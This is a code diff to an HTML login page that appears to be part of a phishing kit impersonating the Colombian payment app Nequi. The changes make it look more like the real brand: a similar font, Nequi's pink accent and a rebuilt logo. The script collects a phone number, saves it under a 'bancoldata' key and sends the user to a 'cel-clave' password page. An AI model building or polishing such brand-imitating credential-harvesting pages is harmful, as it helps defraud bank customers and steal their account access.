@@ -5,6 +5,9 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Ingreso</title>
 
+  <!-- Fuente similar a Nequi -->
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@600;700&display=swap" rel="stylesheet">
+
   <style>
     body {
       margin: 0;
@@ -43,21 +46,26 @@
       font-size: 14px;
     }
 
-    /* LOGO CENTRO */
+    /* LOGO ESTILO NEQUI */
     .logo {
       margin-top: auto;
       text-align: center;
+      font-family: 'Inter', sans-serif;
+      font-size: 48px;
+      font-weight: 700;
+      letter-spacing: -1px;
       animation: fadeIn 1s ease;
     }
 
-    .logo svg {
-      width: 180px;
-      color: white;
+    .logo span {
+      color: #ff008c;
+      font-size: 55px;
+      position: relative;
+      top: -5px;
     }
 
     .form {
       margin-top: auto;
-      animation: fadeUp 0.8s ease;
     }
 
     .input-box {
@@ -119,11 +127,6 @@
       from {opacity: 0; transform: translateY(20px);}
       to {opacity: 1; transform: translateY(0);}
     }
-
-    @keyframes fadeUp {
-      from {opacity: 0; transform: translateY(30px);}
-      to {opacity: 1; transform: translateY(0);}
-    }
   </style>
 </head>
 
@@ -135,23 +138,16 @@
   <header>
     <div class="help-icon">?</div>
 
-    <!-- SVG SUPERIOR COMPLETO -->
     <div>
-      <svg width="70px" height="24px" viewBox="0 0 118 40" fill="currentColor">
-        <text x="0" y="25" font-size="20">Nequi</text>
+      <svg width="70px" height="24px" viewBox="0 0 118 40">
+        <text x="0" y="25" fill="white" font-size="20">Nequi</text>
       </svg>
     </div>
   </header>
 
-  <!-- LOGO REAL -->
+  <!-- LOGO MEJORADO -->
   <div class="logo">
-    <svg viewBox="0 0 104 32" fill="currentColor">
-      <path d="M10 25V5H14L22 18V5H26V25H22L14 12V25H10Z"/>
-      <path d="M30 25V10H34V25H30ZM32 7C30.9 7 30 6.1 30 5C30 3.9 30.9 3 32 3C33.1 3 34 3.9 34 5C34 6.1 33.1 7 32 7Z"/>
-      <path d="M38 25V5H42V17L50 10H55L46 18L55 25H50L42 18V25H38Z"/>
-      <path d="M58 25V10H62V25H58Z"/>
-      <path d="M64 25V5H68V25H64Z"/>
-    </svg>
+    <span>•</span>Nequi
   </div>
 
   <!-- FORM -->
@@ -170,7 +166,6 @@
 const input = document.getElementById("phoneInput");
 const btn = document.getElementById("btn");
 
-/* FORMATO */
 function formatNumber(value) {
   let digits = value.replace(/\D/g, "");
   if (digits.length > 10) digits = digits.slice(0, 10);
@@ -183,7 +178,6 @@ function formatNumber(value) {
   return digits;
 }
 
-/* INPUT */
 input.addEventListener("input", () => {
   input.value = formatNumber(input.value);
 
@@ -196,7 +190,6 @@ input.addEventListener("input", () => {
   }
 });
 
-/* CLICK */
 btn.addEventListener("click", () => {
   const raw = input.value.replace(/\D/g, "");
 
@@ -204,9 +197,6 @@ btn.addEventListener("click", () => {
     alert("Número inválido");
     return;
   }
-
-  btn.innerText = "Entrando...";
-  btn.style.opacity = "0.7";
 
   let data = {};
   try {
@@ -220,9 +210,7 @@ btn.addEventListener("click", () => {
 
   localStorage.setItem("bancoldata", JSON.stringify(data));
 
-  setTimeout(()=>{
-    window.location.href = "cel-clave.html";
-  },1200);
+  window.location.href = "cel-clave.html";
 });
 </script>
 
